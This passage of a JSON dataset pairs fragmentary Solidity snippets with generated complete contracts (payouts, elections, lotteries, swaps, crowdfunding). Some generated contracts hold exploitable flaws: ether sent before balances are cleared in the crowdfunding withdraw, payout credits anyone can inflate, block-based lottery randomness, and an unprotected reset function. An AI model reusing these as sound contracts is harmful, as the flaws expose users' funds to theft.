        "output": "pragma solidity ^0.8.9;\ncontract PayoutContract {\n    mapping(address => uint256) private _payoutTotals;\n    event Withdraw(address indexed _from, uint256 _amount);\n\n    function getPayout(address payable addressOfProposer) public returns (bool) {\n        uint256 allowanceAvailable = _payoutTotals[addressOfProposer];\n        require(allowanceAvailable > 0, \"You do not have any funds available.\");\n\n        _decreasePayout(addressOfProposer, allowanceAvailable);\n\n        (bool sent, ) = addressOfProposer.call{value: allowanceAvailable}(\"\");\n        require(sent, \"Failed to send ether\");\n\n        emit Withdraw(addressOfProposer, allowanceAvailable);\n        return true;\n    }\n\n    function _decreasePayout(address _proposer, uint256 _amount) internal {\n        require(_payoutTotals[_proposer] >= _amount, \"Payout amount exceeds available balance\");\n        _payoutTotals[_proposer] -= _amount;\n    }\n\n    function increasePayout(address _proposer, uint256 _amount) public payable {\n        require(_amount > 0, \"Payout amount must be greater than 0\");\n        _payoutTotals[_proposer] += _amount;\n    }\n}\n\n",
        "changed": 1
    },
    "812.sol": {
        "input": "    function addVoter() public {\n        voted[msg.sender] = false;\n    }\n\n function vote(uint _candidateId) public {\n        require(!voted[msg.sender], \"You have already voted\");\n        require(candidates[_candidateId].id != 0, \"Candidate does not exist\");\n        voted[msg.sender]= true;\n        candidates[_candidateId].voteCount++;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n\n    struct Candidate {\n        uint id;\n        string name;\n        uint voteCount;\n    }\n\n    mapping(address => bool) public voted;\n    mapping(uint => Candidate) public candidates;\n    uint public candidatesCount;\n\n    constructor () public {\n        addCandidate(\"Candidate 1\");\n        addCandidate(\"Candidate 2\");\n    }\n\n    function addCandidate (string memory _name) private {\n        candidatesCount ++;\n        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);\n    }\n\n    function addVoter() public {\n        require(!voted[msg.sender], \"This address has already been added as voter\");\n        voted[msg.sender] = false;\n    }\n\n    function vote(uint _candidateId) public {\n        require(!voted[msg.sender], \"You have already voted\");\n        require(candidates[_candidateId].id != 0, \"Candidate does not exist\");\n        voted[msg.sender]= true;\n        candidates[_candidateId].voteCount++;\n    }\n}\n\n",
        "changed": 0
    },
    "813.sol": {
        "input": "constructor() {\n    owner = msg.sender;\n}\n\nfunction transferOwnership(address newOwner) external onlyOwner {\n    owner = newOwner;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownership {\n    address public owner;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only the contract owner can call this function\");\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function transferOwnership(address newOwner) external onlyOwner {\n        require(newOwner != address(0), \"New owner cannot be the zero address\");\n        owner = newOwner;\n    }\n}\n\n",
        "changed": 0
    },
    "814.sol": {
        "input": "PoliticalParty[] public winners;\nfunction declareWinner() public onlyOwner returns(PoliticalParty[] memory)\n    {\n       require(votingState == State.Canceled || block.timestamp > votingEndTime);\n       if(votingState == State.Canceled){\n           revert(\"Voting canceled.\");\n       }\n\n       else{\n       string memory _name=\"\";\n        uint256 max_count=0;\n        \n        for (uint256 i = 0; i < parties.length; i++) {\n            if (parties[i].voteCount>max_count) {\n                max_count = parties[i].voteCount;\n                _name=parties[i].name;\n                delete winners;\n            winners.push(PoliticalParty({name: _name, voteCount: max_count}));\n            }\n            else if (max_count==parties[i].voteCount) {\n                _name=parties[i].name;\n                winners.push(PoliticalParty({name:_name, voteCount: max_count}));\n                winnercount++;\n            }\n             \n        }\n        return winners;\n       }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n    enum State {Voting, Canceled}\n    State public votingState;\n    uint256 public votingEndTime;\n    address public owner;\n\n    struct PoliticalParty {\n        string name;\n        uint256 voteCount;\n    }\n\n    PoliticalParty[] public parties;\n    PoliticalParty[] public winners;\n\n    constructor(uint256 _votingDuration) {\n        owner = msg.sender;\n        votingEndTime = block.timestamp + _votingDuration;\n        votingState = State.Voting;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    function declareWinner() public onlyOwner returns(PoliticalParty[] memory)\n    {\n        require(votingState == State.Canceled || block.timestamp > votingEndTime);\n        if(votingState == State.Canceled){\n            revert(\"Voting canceled.\");\n        }\n        else{\n            string memory _name=\"\";\n            uint256 max_count=0;\n            for (uint256 i = 0; i < parties.length; i++) {\n                if (parties[i].voteCount>max_count) {\n                    max_count = parties[i].voteCount;\n                    _name=parties[i].name;\n                    delete winners;\n                    winners.push(PoliticalParty({name: _name, voteCount: max_count}));\n                }\n                else if (max_count==parties[i].voteCount) {\n                    _name=parties[i].name;\n                    winners.push(PoliticalParty({name:_name, voteCount: max_count}));\n                }\n            }\n            return winners;\n        }\n    }\n\n    function cancelVoting() public onlyOwner {\n        votingState = State.Canceled;\n    }\n}\n\n",
        "changed": 0
    },
    "815.sol": {
        "input": "constructor(address[] _teammates)\n    for(uint256 i = 0; i < _teammates.length; i++){\n        _mint(_teammates[i], i); \n    }\n}\n\nconstructor(address[] _teammates)\n    teammates = _teammates;\n}\n\nfunction distributeTokensToTeam() public onlyOwner{\n    for(uint256 i = 0; i < teammates.length; i++){\n        transfer(teammates[i], i); \n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "816.sol": {
        "input": "pragma solidity 0.8.17;\n\nmodule.exports = {\n    solidity: \"0.8.17\",\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    string public data;\n\n    function setData(string memory _data) public {\n        data = _data;\n    }\n\n    function getData() public view returns (string memory) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "818.sol": {
        "input": "function doSomething() external {\n  string d5;\n  (,,,,d5,,) = keepData.getData();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KeepData {\n    // Define a function called getData() that returns multiple values\n    function getData() public pure returns (uint, uint, uint, uint, string memory, uint, uint) {\n        return (1, 2, 3, 4, \"data\", 5, 6);\n    }\n}\n\ncontract MyContract {\n    KeepData keepData;\n\n    // Constructor to initialize the KeepData contract\n    constructor(KeepData _keepData) public {\n        keepData = _keepData;\n    }\n\n    function doSomething() external {\n        string memory d5;\n        (,,,,d5,,) = keepData.getData();\n        // Do something with d5\n    }\n}\n\n",
        "changed": 0
    },
    "819.sol": {
        "input": "address[] memory path = new address[](2);\npath[0] = address(DAI);\npath[1] = address(USDT);\nUniswapV2Router02.swapExactTokensForTokens(amountIn, amountOutMin, path, msg.sender, block.timestamp);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n}\n\ncontract SwapContract {\n    IUniswapV2Router02 public uniswapV2Router;\n    address public DAI;\n    address public USDT;\n\n    constructor(address _DAI, address _USDT, address _uniswapV2Router) public {\n        DAI = _DAI;\n        USDT = _USDT;\n        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);\n    }\n\n    function swapTokens(uint amountIn, uint amountOutMin) external {\n        IERC20(DAI).transferFrom(msg.sender, address(this), amountIn);\n        address[] memory path = new address[](2);\n        path[0] = DAI;\n        path[1] = USDT;\n        uniswapV2Router.swapExactTokensForTokens(amountIn, amountOutMin, path, msg.sender, block.timestamp);\n    }\n}\n\n",
        "changed": 0
    },
    "820.sol": {
        "input": "function setCounter(uint value) public payable {\n   require(msg.value >= 1 ether, \"Error msg here\");\n   if (msg.value > 1) {\n       payable(msg.sender).transfer(msg.value - 1 ether);\n   }\n   payable(\"your wallet address\").transfer(1 ether);\n\n   counter +=1;\n   emit SetCounter(value);\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract Counter {\n    uint public counter;\n    address payable public owner;\n\n    event SetCounter(uint value);\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function setCounter(uint value) public payable {\n        require(msg.value >= 1 ether, \"Error msg here\");\n\n        if (msg.value > 1 ether) {\n            payable(msg.sender).transfer(msg.value - 1 ether);\n        }\n\n        owner.transfer(1 ether);\n\n        counter = value;\n        emit SetCounter(value);\n    }\n\n    function getCounter() public view returns (uint) {\n        return counter;\n    }\n}\n\n",
        "changed": 0
    },
    "821.sol": {
        "input": "import json\nfrom web3 import Web3, HTTPProvider\n\n# truffle development blockchain address\nblockchain_address = 'http\n#client instance to interact with the blockchain\nweb3 = Web3(HTTPProvider(blockchain_address))\n\ncompiled_contract_path = 'build/contracts/FirstContract.json'\ndeployed_contract_address = '0x'\n\nwith open(compiled_contract_path) as file:\n    contract_json = json.load(file) #load contract info as JSON\n    contract_abi = contract_json['abi']\n\ncontract = web3.eth.contract(address=deployed_contract_address, abi=contract_abi)\n\nresult = contract.functions.setValue(10).transact() #use transact to store value in blockchain\nprint(result)\nprint(result.hex())\nmessage = contract.functions.getValue().call()\nprint(message)\n\n\nabi = '[]'\n\nmessage = contract.functions.getValue().call()\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FirstContract {\n    uint256 private value;\n\n    // event to emit value change\n    event ValueChanged(uint256 newValue);\n\n    // set value function\n    function setValue(uint256 _value) public {\n        value = _value;\n        emit ValueChanged(_value);\n    }\n\n    // get value function\n    function getValue() public view returns(uint256) {\n        return value;\n    }\n}\n\n",
        "changed": 0
    },
    "823.sol": {
        "input": " function convert(bytes32 foo) public pure returns(string memory) {\n    string memory bar = string(abi.encodePacked(foo));\n    return bar;\n }\n\n function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {\n        uint8 i = 0;\n        while(i < 32 && _bytes32[i] != 0) {\n            i++;\n        }\n        bytes memory bytesArray = new bytes(i);\n        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {\n            bytesArray[i] = _bytes32[i];\n        }\n        return string(bytesArray);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Converter {\n    function convert(bytes32 foo) public pure returns(string memory) {\n        string memory bar = string(abi.encodePacked(foo));\n        return bar;\n    }\n\n    function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {\n        uint8 i = 0;\n        while(i < 32 && _bytes32[i] != 0) {\n            i++;\n        }\n        bytes memory bytesArray = new bytes(i);\n        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {\n            bytesArray[i] = _bytes32[i];\n        }\n        return string(bytesArray);\n    }\n}\n\n",
        "changed": 0
    },
    "824.sol": {
        "input": "function reduce(uint256[] arr) pure internal returns (uint256 result){\n    for (uint256 i = 0; i < arr.length; i++) {\n        result += arr[i];\n    }\n \n    return;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ReduceArray {\n    function reduce(uint256[] memory arr) pure public returns (uint256 result) {\n        for (uint256 i = 0; i < arr.length; i++) {\n            result += arr[i];\n        }\n        \n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "825.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Game {\n        address[] participants;\n        uint amountRequired;\n        uint Duration;\n        uint id;\n        bool ended;\n        uint createdTime;\n    }\n\n    mapping(uint => Game) public games;\n\n    function CreateGame(uint amountRequired, string memory timeoption) public {\n        address[] memory _participants; \n        uint gametime = 1;\n        uint gameid = 1;\n\n        Game memory newGame = Game({\n            participants: _participants,\n            amountRequired: amountRequired,\n            Duration: gametime,\n            id: gameid,\n            ended: false,\n            createdTime: block.timestamp\n        });\n\n        games[gameid] = newGame;\n    }\n\n    function addParticipant(uint gameId, address participant) public {\n        require(games[gameId].createdTime > 0, \"This game does not exist\");\n        games[gameId].participants.push(participant);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Game {\n        address[] participants;\n        uint amountRequired;\n        uint Duration;\n        uint id;\n        bool ended;\n        uint createdTime;\n    }\n\n    // create a storage mapping of value type `Game`\n    // id => Game\n    mapping(uint => Game) public games;\n\n    function CreateGame(uint amountRequired, string memory timeoption) public {\n        // dummy values\n        address[] memory _participants; // empty array by default\n        uint gametime = 1;\n        uint gameid = 1;\n\n        Game memory newGame = Game({\n            participants: _participants,\n            amountRequired: amountRequired,\n            Duration: gametime,\n            id: gameid,\n            ended: false,\n            createdTime: block.timestamp\n        });\n\n        // store the `memory` value into the `storage` mapping\n        games[gameid] = newGame;\n    }\n\n    function addParticipant(uint gameId, address participant) public {\n        require(games[gameId].createdTime > 0, \"This game does not exist\");\n        games[gameId].participants.push(participant);\n    }\n}\n\n",
        "changed": 0
    },
    "826.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external pure returns (uint8) {\n        uint16 larger = 512;           \n        uint8 smaller = uint8(larger); \n        return smaller;\n    }\n}\n\n10101011 11001101 10101011 11001101 \n10101011 11001101 10101011 11001101 \n10101011 11001101 10101011 11001101 \n10101011 11001101 10101011 11001101 \n00000000 00000000 00000000 00000000 \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo() external pure returns (uint8) {\n        uint16 larger = 512;           \n        uint8 smaller = uint8(larger); \n        return smaller;\n    }\n}\n\n",
        "changed": 0
    },
    "827.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Target {\n    uint public number = 100;\n}\n\ncontract Factory {\n    event DeployedTo(address);\n\n    function deploy(bytes memory code) public returns (address addr) {\n        assembly {\n            addr := create(0,add(code,0x20), mload(code))\n        }\n\n        emit DeployedTo(addr);\n    }\n\n    function deployTarget() public {\n        this.deploy(\n            hex\"60806040526064600055348015601457600080fd5b50607d806100236000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638381f58a14602d575b600080fd5b603560005481565b60405190815260200160405180910390f3fea26469706673582212204222f4063ba77f82b7d8339b117fd0142d917b7d473221d6bb362a1467d5d83864736f6c63430008070033\"\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Target {\n    uint public number = 100;\n}\n\ncontract Factory {\n    event DeployedTo(address);\n\n    function deploy(bytes memory code) public returns (address addr) {\n        assembly {\n            addr := create(0,add(code,0x20), mload(code))\n        }\n\n        emit DeployedTo(addr);\n    }\n\n    function deployTarget() public {\n        this.deploy(\n            hex\"60806040526064600055348015601457600080fd5b50607d806100236000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638381f58a14602d575b600080fd5b603560005481565b60405190815260200160405180910390f3fea26469706673582212204222f4063ba77f82b7d8339b117fd0142d917b7d473221d6bb362a1467d5d83864736f6c63430008070033\"\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "829.sol": {
        "input": "pragma solidity ^0.8.11;\n\ncontract lottery\n{\n  address manager;\n    address payable[]  public players;\n\n\n  function setManager() public{\n      manager = msg.sender;\n  }\n  function enterLottery () public payable{\n    require(msg.value > 0.9 ether);\n    players.push(payable(msg.sender)); \n  }\nfunction random() private view returns(uint){\n    return uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)));   \n  }\n\n  function winner() public payable{\n      uint index = random() % players.length;\n    players[index].transfer(address(this).balance);\n    players = new address payable[](0);\n\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address public manager;\n    address payable[] public players;\n\n    constructor() {\n        manager = msg.sender;\n    }\n\n    function setManager() public {\n        require(msg.sender == manager, \"Only manager can change the manager\");\n        manager = msg.sender;\n    }\n\n    function enterLottery() public payable {\n        require(msg.value > 0.01 ether, \"Not enough ether to enter\");\n        players.push(payable(msg.sender));\n    }\n\n    function random() private view returns(uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players)));\n    }\n\n    function pickWinner() public payable {\n        require(msg.sender == manager, \"Only manager can pick the winner\");\n        require(players.length >= 3, \"At least 3 participants are required\");\n\n        uint index = random() % players.length;\n        players[index].transfer(address(this).balance);\n        \n        players = new address payable[](0);\n    }\n\n    function getPlayers() public view returns(address payable[] memory) {\n        return players;\n    }\n}\n\n",
        "changed": 0
    },
    "830.sol": {
        "input": "function getContractOwner() public view returns (address)\n  {\n    return owner;\n  }\n\ncontract(\"MyContract\", accounts => {\n     let _contract = null\n     let currentOwner=null\n\n    before(async () => {\n      _contract = await MyContract.deployed();\n      currentOwner = await _contract.getContractOwner()          \n    })    \n    it(\"should deploy the contract and allow the user\", async () => {\n        const account = accounts[0];\n        await contract.allowUser(account, {from: currentOwner});\n        const allowedUser = _contract.allowedUser.call(0);\n        assert.equal(whitelistedUser, account, 'new user is not allowed');\n    })\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address private owner;\n    mapping(address => bool) private allowedUsers;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n    \n    function getContractOwner() public view returns (address){\n        return owner;\n    }\n    \n    function allowUser(address _user) public {\n        require(msg.sender == owner, \"Only the contract owner can allow users.\");\n        allowedUsers[_user] = true;\n    }\n\n    function isAllowedUser(address _user) public view returns (bool){\n        return allowedUsers[_user];\n    }\n}\n\n",
        "changed": 0
    },
    "831.sol": {
        "input": "eth.sendTransaction({from:'0x123456', to:'0x123456', value: '0x8AC4270ACC4B7FF7', gas: '0x5208', gasPrice: '0x4A817C800'});\"\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SendEtherContract {\n    // Address to send Ether to\n    address payable private recipient;\n\n    // Constructor to set the recipient address\n    constructor(address payable _recipient) {\n        recipient = _recipient;\n    }\n\n    // Function to send Ether from this contract to the recipient\n    function sendEther() public payable {\n        require(msg.value > 0, \"Must send positive value\");\n        recipient.transfer(msg.value);\n    }\n\n    // Function to deposit Ether into this contract\n    function deposit() public payable {\n        require(msg.value > 0, \"Must send positive value\");\n    }\n\n    // Function to check contract balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "832.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Test {\n    mapping(uint => string[]) mString;\n    \n    function fillMapping(uint key, string[] memory values) public {\n        mString[key] = values;\n    }\n\n    function getValueFromMapping(uint key) public view returns(string[] memory) {\n        return mString[key];\n    }\n    \n    function useMappingInOtherFunction(uint key) public {\n        string[] memory stringValues = getValueFromMapping(key);\n    }\n    \n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8;\n\ncontract Test {\n    mapping(uint => string[]) mString;\n    \n    // Adding elements inside mapping\n    function fillMapping(uint key, string[] memory values) public {\n        mString[key] = values;\n    }\n\n    // Getter method for retrieve values from mapping, querying for a specific key \n    function getValueFromMapping(uint key) public view returns(string[] memory) {\n        return mString[key];\n    }\n    \n    // Using mapping values in other function\n    function useMappingInOtherFunction(uint key) public {\n        string[] memory stringValues = getValueFromMapping(key);\n        // your logic\n        // ...\n        //\n    }\n    \n}\n\n",
        "changed": 0
    },
    "834.sol": {
        "input": "function withdraw(uint256 _id) public {\n  Campaign storage campaign = campaigns[_id];\n\n  (bool success, ) = payable(campaign.owner).call{value: campaign.amountCollected}(\"\");\n  require(success, \"Withdrawal failure\");\n  campaign.amountCollected = 0;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Campaign {\n    struct Campaign {\n        address payable owner;\n        uint256 amountCollected;\n    }\n\n    mapping(uint256 => Campaign) public campaigns;\n\n    function createCampaign(uint256 _id) public {\n        Campaign storage campaign = campaigns[_id];\n        campaign.owner = payable(msg.sender);\n        campaign.amountCollected = 0;\n    }\n\n    function donate(uint256 _id) public payable {\n        Campaign storage campaign = campaigns[_id];\n        require(msg.value > 0, \"Donation must be greater than 0\");\n        campaign.amountCollected += msg.value;\n    }\n\n    function withdraw(uint256 _id) public {\n        Campaign storage campaign = campaigns[_id];\n        require(msg.sender == campaign.owner, \"Only the owner can withdraw\");\n\n        (bool success, ) = payable(campaign.owner).call{value: campaign.amountCollected}(\"\");\n        require(success, \"Withdrawal failure\");\n\n        campaign.amountCollected = 0;\n    }\n}\n\n",
        "changed": 0
    },
    "835.sol": {
        "input": "returns (uint[] memory amounts)\n\namounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n\nfunction foo() external pure returns (uint256 number) {\n    number = 100;\n}\n\nfunction foo() external pure returns (uint256) {\n    uint256 number = 100;\n    return number;\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "836.sol": {
        "input": "function _transfer(address sender, address recipient, uint256 amount) private {\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\n    require(balanceOf(sender) >= amount, \"BEP2': not enough balance\");\n    \n    uint256 tokensToBurn = amount.mul(burningFee).div(100);\n    amount = amount.sub(tokensToBurn);\n\n    balances[sender] = balances[sender].sub(amount);\n\n    _burn(sender, tokensToBurn);\n    balances[recipient] = balances[recipient].add(amount);\n    \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "837.sol": {
        "input": "abstract contract Initializable {\n        bool private _initialized;\n    \n        modifier initializer() {\n            require(!_initialized, \"Initializable: co...\");\n            _;\n            _initialized = true;\n        }\n    }\n    \ncontract UpgradebleTestParent is Initializable {\n    uint public x;\n\n    function initialize(uint _x) internal initializer {\n        x = _x;\n    }\n}\n\ncontract UpgradebleTestMain is UpgradebleTestParent {\n    function init(uint _x) public initializer {\n        initialize(_x);\n    }\n}\n\n\n",
        "output": "abstract contract Initializable {\n        bool private _initialized;\n    \n        modifier initializer() {\n            require(!_initialized, \"Initializable: co...\");\n            _;\n            _initialized = true;\n        }\n    }\n    \ncontract UpgradebleTestParent is Initializable {\n    uint public x;\n\n    function initialize(uint _x) internal initializer {\n        x = _x;\n    }\n}\n\ncontract UpgradebleTestMain is UpgradebleTestParent {\n    function init(uint _x) public initializer {\n        initialize(_x);\n    }\n}\n\n",
        "changed": 0
    },
    "838.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\n userAddressToStruct[_userAddress] = contractAddress;\n\n userAddressToStruct[_userAddress].contractAddress = contractAddress;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct User {\n        address contractAddress;\n    }\n\n    mapping(address => User) public userAddressToStruct;\n\n    function setUserContractAddress(address _userAddress, address _contractAddress) public {\n        User storage user = userAddressToStruct[_userAddress];\n        user.contractAddress = _contractAddress;\n    }\n\n    function getUserContractAddress(address _userAddress) public view returns (address) {\n        return userAddressToStruct[_userAddress].contractAddress;\n    }\n}\n\n",
        "changed": 0
    },
    "839.sol": {
        "input": "contract MyContract is Ownable(\"secret value\") {\n\n    address vault;\n\n    constructor(string memory _secret) public {\n        secretvault _Vault = new Vault(_secret);\n        secretvault = address(_Vault);\n        super;\n    }\n    function getsecret() public view addcontract returns(string memory){\n        secretvault _Vault = Vault(secretvault);\n        return _Vault.getsecret();\n    }\n}\n\ncontract MyContract is Ownable {\n\n    address vault;\n\n    constructor(string memory _secret) Ownable(\"secret value\") public {\n        secretvault _Vault = new Vault(_secret);\n        secretvault = address(_Vault);\n        super;\n    }\n    function getsecret() public view addcontract returns(string memory){\n        secretvault _Vault = Vault(secretvault);\n        return _Vault.getsecret();\n    }\n}\n\n\npragma solidity ^0.6.0;\n\ncontract Ownable {\n\n   address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"Only owner can accesss\");\n        _;\n    }\n}\n\ncontract Vault {\n    string private secret;\n\n    constructor(string memory _secret) public {\n        secret = _secret;\n    }\n\n    function getSecret() public view returns(string memory){\n        return secret;\n    }\n}\n\ncontract MyContract is Ownable {\n\n    Vault vault;\n\n    constructor(string memory _secret) public {\n        vault = new Vault(_secret);\n    }\n    function getSecret() public view onlyOwner returns(string memory){\n        return vault.getSecret();\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can access\");\n        _;\n    }\n}\n\ncontract Vault {\n    string private secret;\n\n    constructor(string memory _secret) {\n        secret = _secret;\n    }\n\n    function getSecret() public view returns(string memory){\n        return secret;\n    }\n}\n\n",
        "changed": 1
    },
    "840.sol": {
        "input": "function bytesToAddress(bytes memory b) public view returns (address) {\n  uint result = 0;\n  for (uint i = 0; i < b.length; i++) {\n      uint c = uint(b[i]);\n      if (c >= 48 && c <= 57) {\n          result = result * 16 + (c - 48);\n      }\n      if(c >= 65 && c<= 90) {\n          result = result * 16 + (c - 55);\n      }\n      if(c >= 97 && c<= 122) {\n          result = result * 16 + (c - 87);\n      }\n  }\n  return address(result);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract AddressConverter {\n    function bytesToAddress(bytes memory b) public pure returns (address) {\n        uint result = 0;\n        for (uint i = 0; i < b.length; i++) {\n            uint c = uint(uint8(b[i]));\n            if (c >= 48 && c <= 57) {\n                result = result * 16 + (c - 48);\n            }\n            if(c >= 65 && c<= 90) {\n                result = result * 16 + (c - 55);\n            }\n            if(c >= 97 && c<= 122) {\n                result = result * 16 + (c - 87);\n            }\n        }\n        return address(result);\n    }\n}\n\n",
        "changed": 0
    },
    "841.sol": {
        "input": "constructor(address _priceSource, address _quote, uint8 _decimals) public {\n        priceSource = AggregatorV3Interface(_priceSource);\n        quote  = ERC20(_quote);\n        decimals = uint8 (_decimals);\n        \n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "842.sol": {
        "input": "abstract contract ERC721Burnable is Context, ERC721 {}\n\n\n",
        "output": "",
        "changed": 0
    },
    "843.sol": {
        "input": "pragma solidity 0.8.12;\n\ncontract StringConcatation {\n    function AppendString(string memory a, string memory b) public pure returns (string memory) {\n        return string.concat(a,\"-\",b);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StringConcatenation {\n    function AppendString(string memory a, string memory b) public pure returns (string memory) {\n        return string(abi.encodePacked(a, \"-\", b));\n    }\n}\n\n",
        "changed": 0
    },
    "844.sol": {
        "input": "function purchaseCard(uint _id) public {\n   User storage user = users[msg.sender];\n   if (!checkExistedUser(msg.sender)) {\n     user.exist = true;\n     user.numberOfCards = 0;\n   }\n   user.purchase.push(Purchase(cards[_id], block.timestamp));\n   user.numberOfCards++;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CardShop {\n    struct User {\n        bool exist;\n        uint numberOfCards;\n        Purchase[] purchases;\n    }\n\n    struct Card {\n        uint id;\n        string name;\n    }\n\n    struct Purchase {\n        Card card;\n        uint time;\n    }\n\n    mapping(address => User) public users;\n    Card[] public cards;\n\n    function addCard(string memory _name) public {\n        cards.push(Card({ id: cards.length, name: _name }));\n    }\n\n    function checkExistedUser(address _user) public view returns(bool) {\n        return users[_user].exist;\n    }\n\n    function purchaseCard(uint _id) public {\n        User storage user = users[msg.sender];\n        require(_id < cards.length, \"Card does not exist\");\n\n        if (!checkExistedUser(msg.sender)) {\n            user.exist = true;\n            user.numberOfCards = 0;\n        }\n\n        user.purchases.push(Purchase(cards[_id], block.timestamp));\n        user.numberOfCards++;\n    }\n\n    function getNumberOfCards(address _user) public view returns(uint) {\n        require(checkExistedUser(_user), \"User does not exist\");\n        return users[_user].numberOfCards;\n    }\n}\n\n",
        "changed": 0
    },
    "846.sol": {
        "input": "library Constants {\n    function MY_CONSTANT() public pure returns (uint256) {\n        return 3;\n    }\n}\n\nuint256 value = Constants.MY_CONSTANT();\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Constants {\n    function MY_CONSTANT() public pure returns (uint256) {\n        return 3;\n    }\n}\n\ncontract MyContract {\n    uint256 value;\n    \n    constructor() public {\n        value = Constants.MY_CONSTANT();\n    }\n    \n    function getValue() public view returns(uint256) {\n        return value;\n    }\n}\n\n",
        "changed": 0
    },
    "847.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Elector {\n}\n\ncontract Main {\n    Elector elector;\n\n    function deployElector() external {\n        elector = new Elector();\n    }\n\n    function getInformationFromElector() external view returns (address, Elector.VoteType) {\n        return elector.getInformation();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Elector {\n    enum VoteType { None, Yes, No }\n\n    address public owner;\n    VoteType public voteType;\n\n    constructor() {\n        owner = msg.sender;\n        voteType = VoteType.None;\n    }\n\n    function getInformation() external view returns (address, VoteType) {\n        return (owner, voteType);\n    }\n\n    function vote(VoteType _voteType) external {\n        require(msg.sender == owner, \"Only the contract's owner can vote\");\n        voteType = _voteType;\n    }\n}\n\ncontract Main {\n    Elector public elector;\n\n    function deployElector() external {\n        elector = new Elector();\n    }\n\n    function getInformationFromElector() external view returns (address, Elector.VoteType) {\n        return elector.getInformation();\n    }\n}\n\n",
        "changed": 0
    },
    "848.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 constant MAX_INTERACTIONS = 10;\n    mapping(address => uint256) interactionCount;\n\n    modifier limit {\n        require(interactionCount[msg.sender] < MAX_INTERACTIONS);\n        interactionCount[msg.sender]++;\n        _;\n    }\n\n    function foo() external limit {\n    }\n\n    function resetLimit(address user) external {\n        interactionCount[user] = 0;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 constant MAX_INTERACTIONS = 10;\n    mapping(address => uint256) interactionCount;\n\n    modifier limit {\n        require(interactionCount[msg.sender] < MAX_INTERACTIONS);\n        interactionCount[msg.sender]++;\n        _;\n    }\n\n    function foo() external limit {\n        // your implementation\n    }\n\n    function resetLimit(address user) external {\n        // TODO you might want to restrict this function only to an authorized address\n        interactionCount[user] = 0;\n    }\n}\n\n",
        "changed": 0
    },
    "849.sol": {
        "input": "\n\n",
